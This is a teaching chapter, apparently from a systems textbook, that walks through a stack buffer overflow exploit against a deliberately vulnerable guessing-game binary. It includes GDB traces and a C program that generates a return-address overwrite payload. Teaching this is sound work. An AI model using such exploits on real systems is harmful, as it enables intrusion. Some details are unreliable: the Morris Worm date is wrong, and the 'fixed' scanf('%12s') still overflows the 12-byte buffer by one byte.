## 7.10. Real World: Buffer Overflow

The C language does not perform automatic array bounds checking. Accessing memory outside of the bounds of an array is problematic and often results in errors such as segmentation faults. However, a clever attacker can inject malicious code that intentionally overruns the boundary of an array (also known as a **buffer**) to force the program to execute in an unintended manner. In the worst cases, the attacker can run code that allows them to gain **root privilege**, or OS-level access to the computer system. A piece of software that takes advantage of the existence of a known buffer overrun error in a program is known as a **buffer overflow exploit**.

In this section, we use GDB and assembly language to fully characterize the mechanics of a buffer overflow exploit. Prior to reading this chapter we encourage you to explore the chapter discussing [GDB for inspecting assembly code](https://diveintosystems.org/book/C3-C_debug/gdb_assembly.html#_debugging_assembly_code).

### [](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#_famous_examples_of_buffer_overflow)7.10.1. Famous Examples of Buffer Overflow

Buffer overflow exploits emerged in the 1980s and remained a chief scourge of the computing industry through the early parts of the 2000s. While many modern operating systems have protections against the simplest buffer overflow attacks, careless programming errors can still leave modern programs wide open to attack. Buffer overflow exploits have recently been discovered in Skype1, Android2, Google Chrome3, and others.

Here are some notable historic examples of buffer overflow exploits.

The Morris Worm

The Morris Worm4 was released in 1998 on ARPANet from MIT (to hide that it was written by a student at Cornell) and exploited a buffer overrun vulnerability that existed in the UNIX finger daemon (`fingerd`). In Linux and other UNIX-like systems, a **daemon** is a type of process that continuously executes in the background, usually performing clean-up and monitoring tasks. The `fingerd` daemon returns a user-friendly report on a computer or person. Most crucially, the worm had a replication mechanism that caused it to be sent to the same computer multiple times, bogging down the system to an unusable state. Although the author claimed that the worm was meant as a harmless intellectual exercise, the replication mechanism enabled the worm to spread easily and made it difficult to remove. In future years, other worms would employ buffer overflow exploits to gain unauthorized access into systems. Notable examples include Code Red (2001), MS-SQLSlammer (2003), and W32/Blaster (2003).

AOL Chat Wars

David Auerbach5, a former Microsoft engineer, detailed his experience with a buffer overflow during his efforts to integrate Microsoft’s Messenger Service (MMS) with AOL Instant Messenger in the late 1990s. Back then, AOL Instant Messenger (AIM) was _the_ service to use if you wanted to instant message (or IM) friends and family. Microsoft tried to gain a foothold in this market by designing a feature in MMS that enabled MMS users to talk to their AIM "buddies." Displeased, AOL patched their servers so that MMS could no longer connect to them. Microsoft engineers figured out a way for MMS clients to mimic the messages sent by AIM clients to AOL servers, making it difficult for AOL to distinguish between messages received by MMS and AIM. AOL responded by changing the way AIM sent messages, and MMS engineers duly changed their client’s messages to once again match AIM’s. This "chat war" continued until AOL started using a buffer overflow error _in their own client_ to verify that sent messages came from AIM clients. Since MMS clients did not have the same vulnerability, the chat wars ended, with AOL as the victor.

### [](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#_a_first_look_the_guessing_game)7.10.2. A First Look: The Guessing Game

To help you understand the mechanism of the buffer overflow attack, we provide the executable of a simple program that enables the user to play a guessing game with the program. Download the `secret` executable at [this link](https://diveintosystems.org/book/C7-x86_64/_attachments/secretx86-64.tar.gz) and extract it using the `tar` command:

```bash
$ tar -xzvf secretx86-64.tar.gz
```

Below, we provide a copy of `main.c` ([main.c](https://diveintosystems.org/book/C7-x86_64/_attachments/main.c)), the main file associated with the executable:

```c
#include <stdio.h>
#include <stdlib.h>
#include "other.h" //contains secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf("You win!\n");
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len, x=3;
    char buf[12]; //buffer (12 bytes long)

    printf("Enter secret number:\n");
    scanf("%s", buf); //read guess from user input
    guess = atoi(buf); //convert to an integer

    secret = getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf("You got it right!\n");
    }
    else {
        printf("You are so wrong!\n");
        return 1; //if incorrect, exit
    }

    printf("Enter the secret string to win:\n");
    scanf("%s", buf); //get secret string from user input

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf("You lose!\n");
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
```

This game prompts the user to enter first a secret number and then a secret string to win the guessing game. The header file `other.h` contains the definition of the `getSecretCode` and `calculateValue` functions, but it is unavailable to us. How then can a user beat the program? Brute forcing the solution will take too long. One strategy is to analyze the `secret` executable in GDB and step through the assembly to reveal the secret number and string. The process of examining assembly code to reveal knowledge of how it works is commonly referred to as **reverse engineering** assembly. Readers comfortable enough with their GDB and assembly reading skills should be able to figure out what the secret number and the secret string should be by using GDB to reverse engineer their values.

However, there is a different, sneakier way to win.

### [](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#_taking_a_closer_look_under_the_c)7.10.3. Taking a Closer Look (Under the C)

The program contains a potential buffer overrun vulnerability at the first call to `scanf`. To understand what is going on, let’s inspect the assembly code of the `main` function using GDB. Let’s also place a breakpoint at address 0x0000000000400717, which is the address of the instruction right before the call to `scanf` (note that placing the breakpoint at the address of `scanf` causes program execution to halt _inside_ the call to `scanf`, not in `main`).

```c
   0x00000000004006f2 <+0>:   push   %rbp
   0x00000000004006f3 <+1>:   mov    %rsp,%rbp
   0x00000000004006f6 <+4>:   sub    $0x20,%rsp
   0x00000000004006fa <+8>:   movl   $0x3,-0x4(%rbp)
   0x0000000000400701 <+15>:  mov    $0x400873,%edi
   0x0000000000400706 <+20>:  callq  0x400500 <printf@plt>
   0x000000000040070b <+25>:  lea    -0x20(%rbp),%rax
   0x000000000040070f <+29>:  mov    %rax,%rsi
   0x0000000000400712 <+32>:  mov    $0x400888,%edi
=> 0x0000000000400717 <+37>:  mov    $0x0,%eax
   0x000000000040071c <+42>:  callq  0x400540 <scanf@plt>
```

[Figure 1](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#beforescan) depicts the stack immediately before the call to `scanf`.

![before](https://diveintosystems.org/book/C7-x86_64/_images/beforeScanf.png)

Figure 1. The call stack immediately before the call to scanf

Prior to the call to `scanf`, the first two arguments for `scanf` are preloaded into registers `%edi` and `%rsi`, respectively. The `lea` instruction at location `<main+25>` creates the reference for array `buf`.

Now, suppose the user enters `1234567890` at the prompt. [Figure 2](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#afterScanf) illustrates what the stack looks like immediately after the call to `scanf` completes.

![after](https://diveintosystems.org/book/C7-x86_64/_images/afterScanf.png)

Figure 2. The call stack immediately after the call to scanf with input 1234567890

Recall that the hex values for the ASCII encodings of the digits 0 to 9 are 0x30 to 0x39, and that each stack memory location is eight bytes long. The frame pointer is 32 bytes away from the stack pointer. Readers tracing along can confirm the value of `%rbp` by using GDB to print its value (`p $rbp`). In the example shown, the value of `%rbp` is 0x7fffffffdd10. The following command allows the reader to inspect the 48 bytes (in hex) below register `%rsp`:

```c
(gdb) x /48bx $rsp
```

This GDB command yields output that looks similar to the following:

```c
(gdb) x /48bx $rsp
0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38
0x7fffffffdcf8: 0x39  0x30  0x00  0x00  0x00  0x00  0x00  0x00
0x7fffffffdd00: 0xf0  0xdd  0xff  0xff  0xff  0x7f  0x00  0x00
0x7fffffffdd08: 0x00  0x00  0x00  0x00  0x03  0x00  0x00  0x00
0x7fffffffdd10: 0xd0  0x07  0x40  0x00  0x00  0x00  0x00  0x00
0x7fffffffdd18: 0x30  0xd8  0xa2  0xf7  0xff  0x7f  0x00  0x00
```

Each line represents one 64-bit address, or two 32-bit addresses. So, the value associated with the 32-bit address 0x7fffffffdd0c is located at the rightmost four bytes of the line showing 0x7fffffffdd08.


> [!NOTE] Multibyte values are stored in little-endian order
> In the preceding assembly segment, the byte at address 0xf7ffffffdd00 is 0xf0, the byte at address 0xf7ffffffdd01 is 0xdd, the byte at address 0xf7ffffffdd02 is 0xff, the byte at address 0xf7ffffffdd03 is 0xff, the byte at address 0xf7ffffffdd04 is 0xff, and the byte at address 0xf7ffffffdd05 is 0x7f. However, the 64-bit _value_ at address 0x7fffffffdd00 is in fact 0x7fffffffddf0. Remember that since x86-64 is a [little-endian](https://diveintosystems.org/book/C4-Binary/byte_order.html#_integer_byte_order) system, the bytes for multibyte values such as addresses are stored in reverse order.


In this example, the address for `buf` is located at the top of the stack. Therefore, the first two addresses hold the inputted bytes associated with input the string 1234567890:

```c
0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38
0x7fffffffdcf8: 0x39  0x30  0x00  0x00  0x00  0x00  0x00  0x00
```

The null termination byte `\0` appears in the third most significant byte location at address 0x7fffffffdcf8 (i.e., at address 0x7fffffffdcfa). Recall that `scanf` terminates all strings with a null byte.

Of course, 1234567890 is not the secret number. Here is the output when we try to run `secret` with input string 1234567890:

```c
$ ./secret
$ ./secret
Enter secret number:
1234567890
You are so wrong!
$ echo $?
1
```

The `echo $?` command prints out the return value of the last executed command in the shell. In this case, the program returned 1, since the secret number we entered is wrong. Recall that by convention, programs return 0 when there are no errors. Our goal going forward is to trick the program into exiting with a return value of 0, indicating that we won the game.

### [](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#_buffer_overflow_first_attempt)7.10.4. Buffer Overflow: First Attempt

Next, let’s try typing in the string `1234567890123456789012345678901234567890123`:

```bash
$ ./secret
Enter secret number:
1234567890123456789012345678901234567890123
You are so wrong!
Segmentation fault (core dumped)
$ echo $?
139
```

Interesting! Now the program crashes with a segmentation fault, with return code 139. [Figure 3](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#afterScanf2) shows what the call stack for `main` looks like immediately after the call to `scanf` with this new input.

![after2](https://diveintosystems.org/book/C7-x86_64/_images/afterScanf2.png)

Figure 3. The call stack immediately after the call to scanf with input 1234567890123456789012345678901234567890123

The input string is so long that it not only overwrote the values stored at 0xd08 and 0xd10, but it spilled over into the return address below the stack frame for `main`. Recall that when a function returns, the program tries to resume execution at the address specified by the return address. In this example, the program tries to resume execution at address 0xf7ff00333231 after exiting `main`, which does not appear to exist. So the program crashes with a segmentation fault.

Rerunning the program in GDB (`input.txt` contains the input string above) reveals this devilry in action:

```c
$ gdb secret
(gdb) break *0x0000000000400717
(gdb) run < input.txt
(gdb) ni
(gdb) x /48bx $rsp
0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38
0x7fffffffdcf8: 0x39  0x30  0x31  0x32  0x33  0x34  0x35  0x36
0x7fffffffdd00: 0x37  0x38  0x39  0x30  0x31  0x32  0x33  0x34
0x7fffffffdd08: 0x35  0x36  0x37  0x38  0x39  0x30  0x31  0x32
0x7fffffffdd10: 0x33  0x34  0x35  0x36  0x37  0x38  0x39  0x30
0x7fffffffdd18: 0x31  0x32  0x33  0x00  0xff  0x7f  0x00  0x00
(gdb) n
Single stepping until exit from function main,
which has no line number information.
You are so wrong!
0x00007fff00333231 in ?? ()
```

Notice that our input string blew past the stated limits of the array `buf`, overwriting all the other values stored on the stack. In other words, our string created a buffer overrun and corrupted the call stack, causing the program to crash. This process is also known as **smashing the stack**.

### [](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#_a_smarter_buffer_overflow_second_attempt)7.10.5. A Smarter Buffer Overflow: Second Attempt

Our first example smashed the stack by overwriting the `%rbp` register and return address with junk, causing the program to crash. An attacker whose goal is to simply crash a program would be satisfied at this point. However, our goal is to trick the guessing game to return 0, indicating that we won the game. We accomplish this by filling the call stack with data more meaningful than junk values. For example, we could overwrite the stack so that the return address is replaced with the address of `endGame`. Then, when the program attempts to return from `main`, it will instead execute `endGame` rather than crashing with a segmentation fault.

To find out the address of `endGame`, let’s inspect `secret` again in GDB:

```c
$ gdb secret
(gdb) disas endGame
Dump of assembler code for function endGame:
   0x00000000004006da <+0>:   push   %rbp
   0x00000000004006db <+1>:   mov    %rsp,%rbp
   0x00000000004006de <+4>:   mov    $0x40086a,%edi
   0x00000000004006e3 <+9>:   callq  0x400500 <puts@plt>
   0x00000000004006e8 <+14>:  mov    $0x0,%edi
   0x00000000004006ed <+19>:  callq  0x400550 <exit@plt>
End of assembler dump.
```

Observe that `endGame` starts at address 0x00000000004006da. [Figure 4](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#finalExploit) illustrates a sample exploit that forces `secret` to run the `endGame` function.

![exploit](https://diveintosystems.org/book/C7-x86_64/_images/finalExploit.png)

Figure 4. A sample string that can force secret to execute the endGame function

Essentially, there are 40 bytes of junk values followed by the return address. Again, since x86-64 is a [little-endian](https://diveintosystems.org/book/C4-Binary/byte_order.html#_integer_byte_order) system the bytes in the return address appear to be in reverse order.

The following program illustrates how an attacker could construct the preceding exploit:

```c
#include <stdio.h>

char ebuff[]=
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*first 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*next 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*following 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*last 10 bytes of junk*/
"\xda\x06\x40\x00\x00\x00\x00\x00" /*address of endGame (little endian)*/
;

int main(void) {
    int i;
    for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/
        printf("%c", ebuff[i]);
    }
    return 0;
}
```

The `\x` before each number indicates that the number is formatted as the hexadecimal representation of a character. After defining `ebuff[]`, the `main` function simply prints it out, character by character. To get the associated byte string, compile and run this program as follows:

```bash
$ gcc -o genEx genEx.c
$ ./genEx > exploit
```

To use the file `exploit` as input to `scanf` it suffices to run `secret` with `exploit` as follows:

```c
$ ./secret < exploit
Enter secret number:
You are so wrong!
You win!
```

The program prints out "You are so wrong!" since the string contained in `exploit` is _not_ the secret number. However, the program also prints out the string "You win!" Recall, though, that our goal is to trick the program to return 0. In a larger system, where the notion of "success" is tracked by an external program, it is often most important what a program returns, not what it prints out.

Checking the return value yields:

```c
$ echo $?
0
```

Our exploit works! We won the game!

### [](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#_protecting_against_buffer_overflow)7.10.6. Protecting Against Buffer Overflow

The example we showed changed the control flow of the `secret` executable, forcing it to return a zero value associated with success. However, an exploit like this could do some real damage. Furthermore, some older computer systems _executed_ bytes from stack memory. If an attacker placed bytes associated with assembly instructions on the call stack, the CPU would interpret the bytes as _real_ instructions, enabling the attacker to force the CPU to execute _any arbitrary code of their choosing_. Fortunately, there are strategies that modern computer systems employ to make it more difficult for attackers to run buffer overflow exploits:

- **Stack randomization**: The OS allocates the starting address of the stack at a random location in stack memory, causing the position/size of the call stack to vary from one run of a program to another. Multiple machines running the same code would have different stack addresses. Modern Linux systems use stack randomization as a standard practice. However, a determined attacker can brute force the attack, by attempting to repeat attacks with different addresses. A common trick is to use a **NOP sled** (i.e., a large number of `nop` instructions) before the actual exploit code. Executing the `nop` instruction (`0x90`) has no effect, other than causing the program counter to increment to the next instruction. As long as the attacker can get the CPU to execute somewhere in the NOP sled, the NOP sled will eventually lead to the exploit code that follows it. Aleph One’s writeup, _Smashing the Stack for Fun and Profit_6 details the mechanism of this type of attack.
- **Stack corruption detection**: Another line of defense is to try to detect when the stack is corrupted. Recent versions of GCC use a stack protector known as a **canary** that acts as a guard between the buffer and the other elements of the stack. A canary is a value stored in a nonwriteable section of memory that can be compared to a value put on the stack. If the canary "dies" during a program’s execution, the program knows that it is under attack and aborts with an error message. A clever attacker can, however, replace the canary to prevent the program from detecting stack corruption.
- **Limiting executable regions**: In this line of defense, executable code is restricted to only particular regions of memory. In other words, the call stack is no longer executable. However, even this defense can be defeated. In an attack utilizing **return-oriented programming** (ROP), an attacker can "cherry-pick" instructions in executable regions and jump from instruction to instruction to build an exploit. There are some famous examples of this online, especially in video games7.

However, the best line of defense is always the programmer. To prevent buffer overflow attacks on your programs, use C functions with **length specifiers** whenever possible and add code that performs array bounds checking. It is crucial that any defined arrays match the chosen length specifiers. [Table 1](https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html#specifiers) lists some common "bad" C functions that are vulnerable to buffer overflow and the corresponding "good" function to use (assume that `buf` is allocated 12 bytes).

Table 1. C Functions with Length Specifiers

|Instead of:|Use:|
|---|---|
|`gets(buf)`|`fgets(buf, 12, stdin)`|
|`scanf("%s", buf)`|`scanf("%12s", buf)`|
|`strcpy(buf2, buf)`|`strncpy(buf2, buf, 12)`|
|`strcat(buf2, buf)`|`strncat(buf2, buf, 12)`|
|`sprintf(buf, "%d", num)`|`snprintf(buf, 12, "%d", num)`|

The `secret2` binary ([secret2x86-64.tar.gz](https://diveintosystems.org/book/C7-x86_64/_attachments/secret2x86-64.tar.gz)) no longer has the buffer overflow vulnerability. The `main` function of this new binary ([main2.c](https://diveintosystems.org/book/C7-x86_64/_attachments/main2.c)) appears below:

```c
#include <stdio.h>
#include <stdlib.h>
#include "other.h" //contain secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf("You win!\n");
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len, x=3;
    char buf[12]; //buffer (12 bytes long)

    printf("Enter secret number:\n");
    scanf("%12s", buf); //read guess from user input (fixed!)
    guess = atoi(buf); //convert to an integer

    secret=getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf("You got it right!\n");
    }
    else {
        printf("You are so wrong!\n");
        return 1; //if incorrect, exit
    }

    printf("Enter the secret string to win:\n");
    scanf("%12s", buf); //get secret string from user input (fixed!)

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf("You lose!\n");
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
```

Notice that we added a length specifier to all calls of `scanf`, causing the `scanf` function to stop reading from input after the first 12 bytes are read. The exploit string no longer breaks the program:

```bash
$ ./secret2 < exploit
Enter secret number:
You are so wrong!
$ echo $?
1
```

Of course, any reader with basic reverse-engineering skills can still win the guessing game by analyzing the assembly code. If you haven’t tried to beat the program yet with reverse engineering, we encourage you to do so now.
